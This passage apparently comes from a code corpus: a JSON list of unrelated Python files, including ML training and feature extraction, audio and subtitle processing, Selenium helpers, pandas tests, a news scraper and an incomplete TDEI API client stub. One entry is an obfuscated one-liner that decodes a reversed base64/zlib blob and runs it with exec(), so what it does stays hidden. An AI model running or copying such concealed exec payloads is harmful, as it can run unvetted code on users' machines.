[],[]\n    if model_similarity is not None: model_similarity.eval()\n    feats_all_similarity = {layer: [] for layer in layers}\n    for i in tqdm(range(0,len(indecies),batch_size)):\n        # compute features in one batch\n        feats_batch_similarity = {layer: [] for layer in layers}\n        for seed in range(sample_num):\n            # get different Augmentation for each sample\n            set_random_seed(seed)\n            x,x_t,label,indexes=Data_set.__getitem__(indecies[i:i+batch_size],mode=\"eval\",s=seed)\n            x_t=x_t.to(device)\n            # compute  features from augmented input data\n            with torch.no_grad():\n                kwargs = {layer: True for layer in layers}  # only forward selected layers\n                if model_similarity is not None:\n                    _, output_aux_similarity = model_similarity(x_t, **kwargs)\n            # Save the feature for different layers we are using the 1 layer only\n            for layer in layers:\n                if model_similarity is not None:\n                    feats_similarity = output_aux_similarity[layer].cpu()\n                    feats_batch_similarity[layer] += feats_similarity.chunk(P.K_shift)\n\n        labels.extend(label)\n        index.extend(indexes)\n\n        # concatenate features in one batch\n        if model_similarity is not None:\n            for key, val in feats_batch_similarity.items():\n                feats_batch_similarity[key] = torch.stack(val, dim=1)  # (B, T, d)\n        # add features in full dataset\n        for layer in layers:\n            if model_similarity is not None: feats_all_similarity[layer] += [feats_batch_similarity[layer]]\n\n    # concatenate features in full dataset\n    if model_similarity is not None:\n        for key, val in feats_all_similarity.items():\n    ",
    "#Cole: these functions are obviously incomplete.\n# Admin users require a bearer token vs. require an API key; functions need option to 'swap' those out\n# Most functions don't call for a bearer token\n\nimport requests\nimport json\n\nbase_url = \"https://tdei-gateway-stage.azurewebsites.net\"\n\n# Refreshes the authentication token using the given API key\nasync def refresh_token(apikey):\n\n    url = base_url + \"/api/v1/refresh-token\"\n\n    payload = \"<string>\"\n    headers = {\n    'Content-Type': 'application/json',\n    'Accept': 'application/json',\n    'x-api-key': '{{apiKey}}'\n    }\n\n    response = requests.request(\"POST\", url, headers=headers, data=payload)\n\n    print(response.text)\n\n# Authenticates the user with the provided credentials and API key\nasync def authenticate(username, password, apiKey):\n\n    url = base_url + \"/api/v1/authenticate\"\n\n    payload = json.dumps({\n    \"username\": \"<string>\",\n    \"password\": \"<string>\"\n    })\n\n    headers = {\n    'Content-Type': 'application/json',\n    'Accept': 'application/json',\n    'x-api-key': '{{apiKey}}'\n    }\n\n    response = requests.request(\"POST\", url, headers=headers, data=payload)\n\n# OSW\n    \n# Uploads an OpenSidewalks (OSW) dataset pre-release with given parameters\nasync def upload_osw_dataset(\n        apiKey, \n        dataset_id, \n        metadata, \n        changeset, \n        bearerToken\n        ):\n\n    url = base_url + \"/api/v1/osw/upload/<string>/<string>?derived_from_dataset_id={{dataset_id}}\"\n\n    payload = {\n        'dataset': '<string>',\n        'metadata': '<string>',\n        'changeset': '<string>'\n        }\n    \n    files=[]\n\n    headers = {\n    'Content-Type': 'multipart/form-data',\n    'Accept': 'application/text',\n    'Authorization': 'Bearer {{bearerToken}}'\n    }\n\n    response = requests.request(\"POST\", url, headers=headers, data=payload, files=files)\n\n    print(response.text)\n\n# Retrieves the upload status of an OSW dataset using its dataset ID\n\nasync def get_upload_status(apiKey, dataset_id):\n\n    url = base_url + \"/api/v1/osw/upload/status/{{dataset_id}}\"\n\n    payload = {}\n    headers = {\n    'Accept': 'application/json',\n    'x-api-key': '{{apiKey}}'\n    }\n\n    response = requests.request(\"GET\", url, headers=headers, data=payload)\n\n    print(response.text)\n\n# Publishes the specified OSW dataset to make it available for users\n\nasync def publish_osw_dataset(apiKey, dataset_id):\n\n    url = base_url + \"/api/v1/osw/publish/{{dataset_id}}\"\n\n    payload = {}\n    headers = {\n    'Accept': 'application/text',\n    'x-api-key': '{{apiKey}}'\n    }\n\n    response = requests.request(\"POST\", url, headers=headers, data=payload)\n\n    print(response.text)\n\n\n# Retrieves the publication status of an OSW dataset using its dataset ID\n\nasync def get_publish_status(apiKey, dataset_id):\n\n    url = base_url + \"/api/v1/osw/publish/status/{{dataset_id}}\"\n\n    payload = {}\n    headers = {\n    'Accept': 'application/json',\n    'x-api-key': '{{apiKey}}'\n    }\n\n    response = requests.request(\"GET\", url, headers=headers, data=payload)\n\n    print(response.text)\n\n\n# Checks the validation status of an OSW dataset using its dataset ID\n\nasync def get_validation_status(apiKey, dataset_id):\n\n    url = base_url + \"/api/v1/osw/validate/status/{{dataset_id}}\"\n\n    payload = {}\n    headers = {\n    'Accept': 'application/json',\n    'x-api-key': '{{apiKey}}'\n    }\n\n    response = requests.request(\"GET\", url, headers=headers, data=payload)\n\n    print(response.text)\n\n\n# Initiates the validation process for the specified OSW dataset\n\nasync def validate_osw_dataset(apiKey, dataset_id):\n    url = base_url + \"/api/v1/osw/validate\"\n\n    payload = {'dataset': '{{dataset_id}}'}\n    files=[\n\n    ]\n    headers = {\n    'Content-Type': 'multipart/form-data',\n    'Accept': 'application/text',\n    'Authorization': 'Bearer {{bearerToken}}'\n    }\n\n    response = requests.request(\"POST\", url, headers=headers, data=payload, files=files)\n\n    print(response.text)\n\n\n# Create a fun# Fetches the status of a format conversion request for an OSW dataset\nasync def get_format_status(apiKey, dataset_id):\n\n    url = base_url + \"/api/v1/osw/convert/status/{{dataset_id}}\"\n\n    payload = {}\n    headers = {\n    'Accept': 'application/json',\n    'x-api-key': '{{apiKey}}'\n    }\n\n    response = requests.request(\"GET\", url, headers=headers, data=payload)\n\n    print(response.text)\n\n\n\n# Downloads the converted file of an OSW dataset\n\nasync def download_converted_file(apiKey, dataset):\n\n    url = base_url + \"/api/v1/osw/convert/download/{{dataset_id}}\"\n\n    payload = {}\n    headers = {\n    'Accept': 'application/octet-stream',\n    'x-api-key': '{{apiKey}}'\n    }\n\n    response = requests.request(\"GET\", url, headers=headers, data=payload)\n\n    print(response.text)\n\n\n# Initiates reformatting of an OSW dataset on demand\n\nasync def reformat_osw_dataset(apiKey, filename):\n\n    url = base_url + \"/api/v1/osw/convert\"\n\n    payload = {'file': '{{filename}}',\n    'source': 'osw',\n    'target': 'osm'}\n    files=[\n\n    ]\n    headers = {\n   ",
    "from torch.optim import AdamW\nfrom pathlib import Path\nimport argparse\n\nfrom utils import (\n    get_device,\n    get_grad_scaler,\n    image_to_grid,\n    save_image,\n    merge_images_h,\n)\nfrom model import MAE\nfrom imagenet1k import get_imagenet1k_train_dl\n\n\ndef get_args():\n    parser = argparse.ArgumentParser()\n\n    parser.add_argument(\"--data_dir\", type=str, required=True)\n\n    args = parser.parse_args()\n\n    args_dict = vars(args)\n    new_args_dict = dict()\n    for k, v in args_dict.items():\n        new_args_dict[k.upper()] = v\n    args = argparse.Namespace(**new_args_dict)\n    return args\n\n\ndef main():\n    args = get_args()\n    DEVICE = get_device()\n\n    BATCH_SIZE = 4\n    dl = get_imagenet1k_train_dl(args.DATA_DIR, batch_size=BATCH_SIZE, n_cpus=2)\n    di = iter(dl)\n\n    patch_size = 16\n    img_size = 256\n    enc_depth = 12\n    enc_width = 768\n    enc_n_heads = 12\n    dec_depth = 2\n    dec_width = 128\n    dec_n_heads = 2\n    model = MAE(\n        img_size,\n        patch_size,\n        enc_depth,\n        enc_width,\n        enc_n_heads,\n        dec_depth,\n        dec_width,\n        dec_n_heads,\n    ).to(DEVICE)\n\n    LR = 1e-3\n    optim = AdamW(model.parameters(), lr=LR, betas=(0.9, 0.95), weight_decay=0.05)\n    scaler = get_grad_scaler(device=DEVICE)\n\n    N_EPOCHS = 600\n    SAMPLES_DIR = Path(__file__).resolve().parent/\"samples\"\n    for batch_idx in range(1, 11):\n        ori_image, _ = next(di)\n        ori_image = ori_image.to(DEVICE)\n\n        ori_grid = image_to_grid(ori_image, n_cols=int(BATCH_SIZE ** 0.5))\n\n        for epoch in range(1, N_EPOCHS + 1):\n            loss = model.get_loss(ori_image)\n            if epoch % 100 == 0 or epoch == N_EPOCHS:\n                print(f\"[ {epoch}/{N_EPOCHS} ][ {loss:.3f} ]\")\n            scaler.scale(loss).backward()\n            scaler.step(optim)\n            scaler.update()\n\n        masked_image, recon_image = model.reconstruct(ori_image)\n        masked_gird = image_to_grid(masked_image, n_cols=int(BATCH_SIZE ** 0.5))\n        recon_grid = image_to_grid(recon_image, n_cols=int(BATCH_SIZE ** 0.5))\n        \n        merged_grid = merge_images_h([masked_gird, recon_grid, ori_grid])\n        save_image(merged_grid, SAMPLES_DIR/f\"{batch_idx}.jpg\")\n\n\nif __name__ == \"__main__\":\n    main()\n",
    "import os\nimport numpy as np\nimport librosa\nimport soundfile as sf\nfrom pydub import AudioSegment\nfrom pydub.silence import split_on_silence\nfrom pydub.playback import play\nfrom tqdm import tqdm\n\ndef clean_audio(audio_path, output_path, selected_chunks, min_silence_len=1000, silence_thresh=-40, keep_silence=100):\n    # Load the audio file\n    audio_segment = AudioSegment.from_file(audio_path)\n\n    # Convert to mono\n    audio_segment = audio_segment.set_channels(1)\n\n    # Normalize the audio\n    audio_segment = normalize_audio(audio_segment)\n\n    # Split on silence\n    chunks = split_on_silence(\n        audio_segment,\n        min_silence_len=min_silence_len,\n        silence_thresh=silence_thresh,\n        keep_silence=keep_silence,\n    )\n\n    # Find the main speaker based on total duration\n    main_speaker_chunk = max(chunks, key=lambda chunk: len(chunk))\n\n    # Apply EQ and compression\n    main_speaker_chunk = apply_eq_and_compression(main_speaker_chunk)\n\n    # Export the main speaker's audio\n    main_speaker_chunk.export(output_path, format=\"wav\")\n\ndef normalize_audio(audio_segment):\n    \"\"\"\n    Normalizes the audio to a target volume.\n    \"\"\"\n    target_dBFS = -20\n    change_in_dBFS = target_dBFS - audio_segment.dBFS\n    return audio_segment.apply_gain(change_in_dBFS)\n\ndef apply_eq_and_compression(audio_segment):\n    \"\"\"\n    Applies equalization and compression to the audio.\n    \"\"\"\n    # Apply EQ\n    audio_segment = audio_segment.high_pass_filter(80)\n    audio_segment = audio_segment.low_pass_filter(12000)\n\n    # Apply compression\n    threshold = -20\n    ratio = 2\n    attack = 10\n    release = 100\n    audio_segment = audio_segment.compress_dynamic_range(\n        threshold=threshold,\n        ratio=ratio,\n        attack=attack,\n        release=release,\n    )\n\n    return audio_segment\n\ndef process_file(wav_file, srt_file, cleaned_folder):\n    print(f\"Processing file: {wav_file}\")\n\n    # Create the cleaned folder if it doesn't exist\n    os.makedirs(cleaned_folder, exist_ok=True)\n\n    input_wav_path = wav_file\n    output_wav_path = os.path.join(cleaned_folder, os.path.basename(wav_file))\n\n    # Review and select desired SRT chunks\n    selected_chunks = review_srt_chunks(input_wav_path, srt_file)\n\n    # Clean the audio based on selected chunks\n    clean_audio(input_wav_path, output_wav_path, selected_chunks)\n\n    print(f\"Cleaned audio saved to: {output_wav_path}\")\n\ndef review_srt_chunks(audio_path, srt_path):\n    audio_segment = AudioSegment.from_wav(audio_path)\n    selected_chunks = []\n\n    with open(srt_path, \"r\") as srt_file:\n        srt_content = srt_file.read()\n        srt_entries = srt_content.strip().split(\"\\n\\n\")\n\n        for entry in tqdm(srt_entries, desc=\"Reviewing SRT chunks\", unit=\"chunk\"):\n            lines = entry.strip().split(\"\\n\")\n            if len(lines) >= 3:\n                start_time, end_time = lines[1].split(\" --> \")\n                start_time = convert_to_milliseconds(start_time)\n                end_time = convert_to_milliseconds(end_time)\n\n                chunk = audio_segment[start_time:end_time]\n                print(\"Playing chunk...\")\n                play(chunk)\n\n                choice = input(\"Keep this chunk? (y/n): \")\n                if choice.lower() == \"y\":\n                    selected_chunks.append((start_time, end_time))\n                    print(\"Chunk selected.\")\n                else:\n                    print(\"Chunk skipped.\")\n\n    return selected_chunks\n\ndef convert_to_milliseconds(time_str):\n    time_str = time_str.replace(\",\", \".\")\n    hours, minutes, seconds = time_str.strip().split(\":\")\n    milliseconds = (int(hours) * 3600 + int(minutes) * 60 + float(seconds)) * 1000\n    return int(milliseconds)\n\n# Set the WAV file, SRT file, and cleaned folder paths\nwav_file = \"/path/to/your/audio.wav\"\nsrt_file = \"/path/to/your/subtitles.srt\"\ncleaned_folder = \"/path/to/cleaned/folder\"\n\n# Process the WAV file\nprocess_file(wav_file, srt_file, cleaned_folder)\n\nprint(\"Processing completed.\")\n",
    "# Obfuscated with PyObfuscate\n# https://www.github.com/htr-tech\n# Time : Tue Apr  2 14:25:20 2024\n# -------------------------------\n_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==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'))",
    "from selenium.webdriver.support import expected_conditions as EC\r\nfrom selenium.webdriver.common.by import By\r\nfrom selenium import webdriver\r\nimport PageObject.SauceDemo\r\n\r\n\r\ndef find_item_by_name(driver, item_name):\r\n    loc = PageObject.SauceDemo.ShopPage.item_in_shop[1]\r\n    locator_edited = loc.replace(\"locator\", item_name)\r\n    item = driver.find_element(By.XPATH, locator_edited)\r\n    return item\r\n\r\n\r\ndef find_item_by_img_name(driver, img_name):\r\n    image = PageObject.SauceDemo.ShopPage.item_img[1]\r\n    locator_edited = image.replace(\"locator\", img_name)\r\n    item = driver.find_element(By.XPATH, locator_edited)\r\n    return item\r\n\r\n\r\ndef enter_text(driver, locator, text):\r\n    find_field = driver.find_element(*locator)\r\n    find_field.send_keys(text)\r\n\r\n\r\ndef list_items_price(driver):\r\n    items = driver.find_elements(By.CLASS_NAME, \"inventory_item_price\")\r\n    items_price = []\r\n    for item in items:\r\n        price_item = item.text.replace(\"$\", '')\r\n        items_price.append(price_item)\r\n\r\n    return items_price\r\n\r\n\r\ndef list_items_names(driver):\r\n    items = driver.find_elements(By.CLASS_NAME, \"inventory_item_name\")\r\n    items_name = []\r\n    for item in items:\r\n        # price_item = item.text.replace(\"$\", '')\r\n        items_name.append(item)\r\n    return items_name\r\n\r\n\r\ndef get_length(driver, locator):\r\n    return len(driver.find_elements(*locator))\r\n\r\n\r\ndef get_text(driver, locator):\r\n    el = driver.find_element(*locator)\r\n    return el.text\r\n\r\n\r\ndef click_element(driver, locator):\r\n    driver.find_element(*locator).click()\r\n\r\n",
    "import logging\nimport asyncio\nimport datetime\nimport contextlib\nimport time\n\nfrom bleak.backends.device import BLEDevice\n\nfrom heartpump.rpi4 import MotorDriver\nfrom heartpump.ble import listen_notifications, discover\nfrom heartpump.tickrx import (\n    TICKX_HEARTRATE_SERVICE_UUID, \n    TICKRX_DEVICE_ID, \n    TICKRX_DEVICE_NAME,\n    TICKRX_HEART_RATE_SERVICE_CHARACTERISTIC,\n    interpret_hrm_characteristic\n)\n\nlogger = logging.getLogger(__name__)\n\n\nasync def hrm_listener(queue: asyncio.Queue, device: BLEDevice):\n        \"\"\"Find BLE HRM device, listen to notifications and enqueue data.\"\"\"\n\n        async def notification_handler(characteristic, data):\n            \"\"\"BLE Notification Handler for HRM Notify Read Event.\"\"\"\n            logger.info(f\"{characteristic.description}: {data}\")\n            d = interpret_hrm_characteristic(data)\n            logger.info(f\"{characteristic.description}: {d}\")\n            await queue.put((time.time(), d))\n\n        await listen_notifications(\n                device, \n                TICKX_HEARTRATE_SERVICE_UUID, \n                TICKRX_HEART_RATE_SERVICE_CHARACTERISTIC,\n                notification_handler,\n                timeout=120\n            )\n        \n        # Send producer stop message.\n        # await queue.put((time.time(), None))\n\n\n\nasync def motor_controller(queue: asyncio.Queue):\n    \"\"\"Consumer of HRM data to simluate motor like a heart beat.\"\"\"\n    hr = 72\n    producer_working = True\n    _ts, _hr = await queue.get()\n    _delta = datetime.datetime.now().timestamp() - _ts\n    logger.info(f\"{_ts=} {_delta=}\")\n    logger.info(f\"{_hr=}\")\n    if _hr is None:\n        return\n    \n    async with MotorDriver() as m:\n        try:            \n            \n            t = datetime.datetime.now().timestamp()\n\n            while producer_working or datetime.datetime.now().timestamp() - t > 30:\n                # logger.info(f\"{hr=}\")\n                m.set_heart_rate(hr)\n                # await asyncio.sleep(0.001)\n\n                try:\n                    _ts, _hr = await asyncio.wait_for(queue.get(), timeout=0.001)\n                    _delta = datetime.datetime.now().timestamp() - _ts\n                    logger.info(f\"{_ts=} {_delta=}\")\n                    logger.info(f\"{_hr=}\")\n                    if _hr is None:\n                        producer_working = False\n                except TimeoutError:\n                    # logger.warn(\"Timeout fetching next HR measurement.\")\n                    ...\n\n\n        except KeyboardInterrupt:\n            ...\n\nasync def main():\n    queue = asyncio.Queue()\n\n    device, adv_data = await discover(TICKRX_DEVICE_NAME, timeout=10)\n    if device is None:\n        logger.error(\"Device not found\")\n        return\n    \n    logger.info(f\"{device=}\")\n    hrm_task = hrm_listener(queue, device)\n    motor_task = motor_controller(queue)\n\n    await asyncio.gather(hrm_task, motor_task)\n\nif __name__ == \"__main__\":\n    log_level = logging.INFO\n    logging.basicConfig(level=log_level)\n    logger.info(\"Starting\")\n    \n    with contextlib.suppress(asyncio.CancelledError):\n        asyncio.run(main())\n",
    "from datetime import timezone\n\nimport numpy as np\nimport pytest\n\nfrom pandas import (\n    DataFrame,\n    Series,\n    date_range,\n)\nimport pandas._testing as tm\n\n\nclass TestTZLocalize:\n    # See also:\n    # test_tz_convert_and_localize in test_tz_convert\n\n    def test_tz_localize(self, frame_or_series):\n        rng = date_range(\"1/1/2011\", periods=100, freq=\"h\")\n\n        obj = DataFrame({\"a\": 1}, index=rng)\n        obj = tm.get_obj(obj, frame_or_series)\n\n        result = obj.tz_localize(\"utc\")\n        expected = DataFrame({\"a\": 1}, rng.tz_localize(\"UTC\"))\n        expected = tm.get_obj(expected, frame_or_series)\n\n        assert result.index.tz is timezone.utc\n        tm.assert_equal(result, expected)\n\n    def test_tz_localize_axis1(self):\n        rng = date_range(\"1/1/2011\", periods=100, freq=\"h\")\n\n        df = DataFrame({\"a\": 1}, index=rng)\n\n        df = df.T\n        result = df.tz_localize(\"utc\", axis=1)\n        assert result.columns.tz is timezone.utc\n\n        expected = DataFrame({\"a\": 1}, rng.tz_localize(\"UTC\"))\n\n        tm.assert_frame_equal(result, expected.T)\n\n    def test_tz_localize_naive(self, frame_or_series):\n        # Can't localize if already tz-aware\n        rng = date_range(\"1/1/2011\", periods=100, freq=\"h\", tz=\"utc\")\n        ts = Series(1, index=rng)\n        ts = frame_or_series(ts)\n\n        with pytest.raises(TypeError, match=\"Already tz-aware\"):\n            ts.tz_localize(\"US/Eastern\")\n\n    @pytest.mark.parametrize(\"copy\", [True, False])\n    def test_tz_localize_copy_inplace_mutate(self, copy, frame_or_series):\n        # GH#6326\n        obj = frame_or_series(\n            np.arange(0, 5), index=date_range(\"20131027\", periods=5, freq=\"1h\", tz=None)\n        )\n        orig = obj.copy()\n        result = obj.tz_localize(\"UTC\", copy=copy)\n        expected = frame_or_series(\n            np.arange(0, 5),\n            index=date_range(\"20131027\", periods=5, freq=\"1h\", tz=\"UTC\"),\n        )\n        tm.assert_equal(result, expected)\n        tm.assert_equal(obj, orig)\n        assert result.index is not obj.index\n        assert result is not obj\n",
    "from spleeter.separator import Separator\nfrom moviepy.editor import AudioFileClip, TextClip, CompositeVideoClip\nimport os\n\ntexto_transcrito = 'output_en.txt'\n\nclass SyncSubtitles:\n    def __init__(self):\n        # Inicializa\u00e7\u00e3o de vari\u00e1veis e configura\u00e7\u00f5es\n        self.separator = Separator('spleeter:2stems')\n        self.font = 'Arial-Bold'\n        self.fontsize = 24\n        self.margin = 10\n\n    def sincronizar_legendas(self, audio_file, texto_transcrito):\n        # Extrai os vocais do \u00e1udio\n        audio_path, _ = os.path.splitext(audio_file)\n        vocals_file = f'{audio_path}_vocals.wav'\n        self.separator.separate_to_file(audio_file, output_path=vocals_file)\n\n        # Segmenta o \u00e1udio em frases\n        # Utilize uma biblioteca de segmenta\u00e7\u00e3o de frases, como o Vosk\n\n        # Gera clipes de texto para cada frase\n        texto_segmentado = ['Frase 1', 'Frase 2', '...']\n        texto_clips = []\n        for frase in texto_segmentado:\n            texto_clip = TextClip(frase, font=self.font, fontsize=self.fontsize, color='white')\n            texto_clips.append(texto_clip)\n\n        # Sincroniza os clipes de texto com o \u00e1udio\n        # Utilize um algoritmo de sincroniza\u00e7\u00e3o, como o Dynamic Time Warping (DTW)\n\n        # Cria o v\u00eddeo final com as legendas\n        audio_clip = AudioFileClip(vocals_file)\n        video_clip = CompositeVideoClip([audio_clip], size=audio_clip.size)\n\n        # Posiciona e insere os clipes de texto no v\u00eddeo\n        for i, texto_clip in enumerate(texto_clips):\n            start_time = i * 5  # Ajustar de acordo com a dura\u00e7\u00e3o das frases\n            end_time = start_time + texto_clip.duration\n            texto_clip = texto_clip.set_position('bottom', margin=self.margin).set_duration(end_time - start_time)\n            video_clip = video_clip.add_clip(texto_clip, start_time=start_time)\n\n        # Salva o v\u00eddeo final\n        video_clip.write_videofile(f'{audio_path}_legendado.mp4', fps=25)\n\n        print('Legendas sincronizadas com sucesso!')\n\n# Exemplo de uso\nsync_subtitles = SyncSubtitles()\naudio_file = '/path/to/audio.wav'\ntexto_transcrito = 'Texto transcrito do \u00e1udio...'\nsync_subtitles.sincronizar_legendas(audio_file, texto_transcrito)\n",
    "from bs4 import BeautifulSoup\nimport requests\nimport pandas as pd\nfrom transformers import BartTokenizer, BartForConditionalGeneration\nfrom article_relevance_function import topic_similarity_with_keyword_check\n\n# For AI Summary\nmodel_name = \"facebook/bart-large-cnn\"\ntokenizer = BartTokenizer.from_pretrained(model_name)\nmodel = BartForConditionalGeneration.from_pretrained(model_name)\n\ndef fetch_article_summary(article_url, content_class):\n    try:\n        response = requests.get(article_url)\n        soup = BeautifulSoup(response.content, 'html.parser')\n\n        article_content = soup.find('div', class_ = content_class)\n        paragraphs = article_content.find_all('p')\n        \n        summary = \"\\n\\n\".join(paragraph.get_text() for paragraph in paragraphs)\n        return summary\n    except Exception as e:\n        print(f\"An error occurred: {e}\")\n        return \"Summary could not be retrieved.\"\n    \ndef summarize_text(text, max_length=512, min_length=100, length_penalty=2.0, num_beams=4):\n    inputs = tokenizer.encode(\"summarize: \" + text, return_tensors=\"pt\", max_length=1024, truncation=True)\n    summary_ids = model.generate(inputs, max_length=max_length, min_length=min_length, length_penalty=length_penalty, num_beams=num_beams, early_stopping=True)\n    summary = tokenizer.decode(summary_ids[0], skip_special_tokens=True)\n    return summary\n\ndef add_to_db(url, articles_df, articleid, headlineid, urladd, content_class):  \n    response = requests.get(url)\n    soup = BeautifulSoup(response.content, 'html.parser')\n\n    article_containers = soup.find_all(articleid, limit=10)\n\n    print(f\"\\n{url}\\n\")\n\n    for article in article_containers:\n        headline_tag = article.find(headlineid)\n        if headline_tag:\n            a_tag = headline_tag.find('a')\n            if a_tag and a_tag.has_attr('href'):\n                full_url = a_tag['href']\n                headline = a_tag.get_text(strip=True)\n                date_span = article.find('time', class_=['published', 'tnt-date'])\n                date_time = date_span['datetime'] if date_span and 'datetime' in date_span.attrs else \"Date not found\"\n                full_url = f\"{urladd}{full_url}\"\n                \n                article_content = fetch_article_summary(full_url, content_class)\n                article_relevance = topic_similarity_with_keyword_check(article_content)\n                \n                if article_relevance:\n                    # With AISummary\n                    temp_df = pd.DataFrame([{'Headline': headline, 'URL': full_url, 'Date and Time': date_time, 'Content': article_content, 'AISummary': summarize_text(article_content)}])\n                    # Without AI Summary (Faster)\n                    # temp_df = pd.DataFrame([{'Headline': headline, 'URL': full_url, 'Date and Time': date_time, 'Content': article_content, 'AISummary': \"Not Pulled - Change code to other option to include\", 'Relevance': article_relevance}])\n\n                    articles_df = pd.concat([articles_df, temp_df], ignore_index=True)\n                    print(f\"{headline}\\nSUCCESSFULLY ENTERED AND SUMMARIZED\")\n                    print(f\"Relevance: {article_relevance}\\n\")\n                else:\n                    print(f\"{headline}\\nSKIPPED\")\n                    print(f\"Relevance: {article_relevance}\\n\")\n\n\n    print(f\"*****\\n\")\n    return(articles_df)\n\ndef scrape_articles_to_db():\n    articles_df = pd.DataFrame(columns=['Headline', 'URL', 'Date and Time', 'Content', 'AISummary', 'Relevance'])\n\n    articles_df = add_to_db(\"https://www.paloaltoonline.com/category/palo-alto-city/\", articles_df, 'article', 'h2',\"\" ,'entry-content')\n    articles_df = add_to_db(\"https://www.paloaltoonline.com/category/palo-alto-city/page/2/\", articles_df, 'article', 'h2',\"\" ,'entry-content')\n    articles_df = add_to_db(\"https://www.mv-voice.com/category/local-news/\", articles_df, 'article', 'h2',\"\" ,'entry-content')\n    articles_df = add_to_db(\"https://www.smdailyjournal.com/news/local/\", articles_df, 'article', 'h3', \"https://www.smdailyjournal.com/\", 'asset-content')\n\n    articles_df = articles_df.drop_duplicates(subset='URL')\n    articles_df['Date and Time'] = 